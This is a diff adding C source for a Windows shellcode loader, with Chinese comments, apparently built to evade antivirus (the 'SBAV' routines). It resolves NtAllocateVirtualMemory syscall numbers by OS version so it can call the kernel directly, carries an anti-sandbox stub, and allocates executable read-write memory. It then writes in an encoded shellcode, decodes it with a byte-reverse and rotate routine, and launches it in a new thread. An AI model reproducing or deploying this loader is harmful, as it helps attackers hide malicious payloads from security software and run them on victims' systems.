@@ -1,0 +1,106 @@
+
+// ---------------------------------------------------------------------------------
+// 函数声明
+// ---------------------------------------------------------------------------------
+
+EXTERN_C NTSTATUS SBAV_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+
+void SBAV_InitShellcode();
+
+// ---------------------------------------------------------------------------------
+// 函数实现
+// ---------------------------------------------------------------------------------
+
+#ifdef OS_AUTO_DETECT
+void SBAV_InitNtAllocateVirtualMemorySyscallNumber()
+{
+	typedef NTSTATUS(WINAPI *SBAV_Type_RtlGetVersion)(LPOSVERSIONINFOEXW);
+	SBAV_Type_RtlGetVersion SBAV_RtlGetVersion;
+	OSVERSIONINFOEXW OsInfo;
+	DWORD MajorVersion = 0;
+	DWORD MinorVersion = 0;
+	SBAV_RtlGetVersion = (SBAV_Type_RtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
+	OsInfo.dwOSVersionInfoSize = sizeof(OsInfo);
+	SBAV_RtlGetVersion(&OsInfo);
+	MajorVersion = OsInfo.dwMajorVersion;
+	MinorVersion = OsInfo.dwMinorVersion;
+	if (MajorVersion == 6)
+	{
+		switch (MinorVersion)
+		{
+		case 0:
+		case 1:
+			SBAV_NtAllocateVirtualMemorySyscallNumber = 0x15;
+			break;
+		case 2:
+			SBAV_NtAllocateVirtualMemorySyscallNumber = 0x16;
+			break;
+		case 3:
+			SBAV_NtAllocateVirtualMemorySyscallNumber = 0x17;
+			break;
+		}
+	}
+	else if (MajorVersion == 10)
+	{
+		SBAV_NtAllocateVirtualMemorySyscallNumber = 0x18;
+	}
+	else
+	{
+		exit(1);
+	}
+}
+#endif
+
+void SBAV_ReverseEncrypt(unsigned char *Data, unsigned long Length)
+{
+    unsigned char temp;
+    for (unsigned long i = 0; i < Length; i++)
+    {
+        temp = Data[i];
+        Data[i] = Data[Length - i - 1];
+        Data[Length - i - 1] = temp;
+        Data[i] = SBAV_ROL4(Data[i]);
+        Data[Length - i - 1] = SBAV_ROL4(Data[Length - i - 1]);
+    }
+}
+
+int SBAV_AntiSandbox()
+{
+	return 0;
+}
+
+// 入口函数，引用头文件后调用这个函数
+int SBAV_StartShellcode()
+{
+	PVOID BaseAddress = NULL;
+	SIZE_T RegionSize = SBAV_ShellcodeSize;	
+
+	// 反沙箱
+	SBAV_AntiSandbox();
+
+	// 动态获取调用号
+#ifdef OS_AUTO_DETECT
+	SBAV_InitNtAllocateVirtualMemorySyscallNumber();
+#endif
+
+	SBAV_NtAllocateVirtualMemory((HANDLE)0xFFFFFFFFFFFFFFFF, &BaseAddress, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	SBAV_Shellcode = (unsigned char *)BaseAddress;
+
+	// 写入shellcode
+	SBAV_InitShellcode();
+
+	// 解密
+	SBAV_ReverseEncrypt((unsigned char *)BaseAddress, SBAV_ShellcodeSize);
+
+	// 执行 shellcode
+	//((LPTHREAD_START_ROUTINE)BaseAddress)(0);
+
+	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)BaseAddress, 0, 0, 0);
+
+	while (1)
+	{
+		Sleep(10000);
+	}
+
+	return 0;
+}
